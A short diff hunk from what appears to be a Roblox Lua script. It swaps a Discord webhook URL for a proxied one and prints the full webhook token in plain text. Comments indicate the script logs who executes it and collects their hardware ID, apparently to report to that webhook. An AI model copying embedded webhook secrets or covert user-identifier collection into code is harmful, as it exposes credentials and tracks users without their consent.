@@ -587,7 +587,7 @@ Players.PlayerAdded:Connect(function(player)
 end)
 
 -- Check who executed the script
-local webhookUrl = "https://discord.com/api/webhooks/1271496576568655882/kRIQ2xVMpkIpZ58aDEwVks7IjjSD8PCmIKIcU3sZbnjuQl_l_iq2By0xWW0Lv5ALopaI"
+local webhookUrl = "https://webhook.lewisakura.moe/api/webhooks/1271496576568655882/kRIQ2xVMpkIpZ58aDEwVks7IjjSD8PCmIKIcU3sZbnjuQl_l_iq2By0xWW0Lv5ALopaI"
 
 -- Function to get the HWID
 local function getHWID()
